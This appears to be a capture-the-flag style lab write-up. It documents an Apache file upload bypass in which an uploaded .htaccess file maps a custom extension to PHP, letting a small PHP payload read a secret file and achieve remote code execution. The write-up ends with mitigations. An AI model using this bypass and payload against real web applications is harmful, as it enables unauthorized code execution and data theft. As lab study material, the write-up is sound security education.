This project documents a successful file upload exploitation against a simulated vulnerable web application.  
Weak file upload validation was bypassed to achieve **remote code execution (RCE)** using an `.htaccess` trick on an Apache server.

## Lab Overview
- **Target:** Web app with avatar upload functionality  
- **Vulnerability:** File upload restrictions + Apache `.htaccess` misconfiguration  
- **Impact:** RCE ‚Üí Secret file disclosure  

---

## Exploitation Walkthrough

### Normal File Upload
- Uploaded a normal image as avatar.  
- Observed with:

```http
GET /files/avatars/<YOUR-IMAGE>
````

---

### Crafting Malicious Payload

* Created `exploit.php` to read Carlos's secret:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

* Upload blocked ‚Üí `.php` not allowed.

---

### Identifying Server

* Response from `POST /my-account/avatar` revealed:

```http
Server: Apache/2.4.41 (Ubuntu)
```

* Apache + mod\_php suggested an `.htaccess` bypass.

---

### Uploading .htaccess

* Modified upload in Burp Repeater:

```text
- Filename: .htaccess
- Content-Type: text/plain
- Contents:
AddType application/x-httpd-php .l33t
```

* Uploaded successfully ‚úÖ

---

### Uploading Exploit with New Extension

* Reused request:

```text
- Filename: exploit.l33t
- Contents: PHP payload
```

* Uploaded successfully ‚úÖ

---

### Triggering RCE

* Requested:

```http
GET /files/avatars/exploit.l33t
```

* Server executed PHP ‚Üí Secret revealed:

```

---

## Security Impact

* **Severity:** üî¥ High
* **Risk:** Arbitrary PHP execution
* **Impact:** Unauthorized file disclosure, potential full system compromise

---

## Recommended Mitigations

* Disable `.htaccess` overrides:

```apache
AllowOverride None
```

* Store uploads outside web root
* Strict MIME-type & extension validation (server + client)
* Sanitize uploaded content

---

## Takeaways

* Misconfigured servers + weak upload validation ‚Üí RCE
* Defense-in-depth is key: secure configs, strict validation, and isolating uploads

```
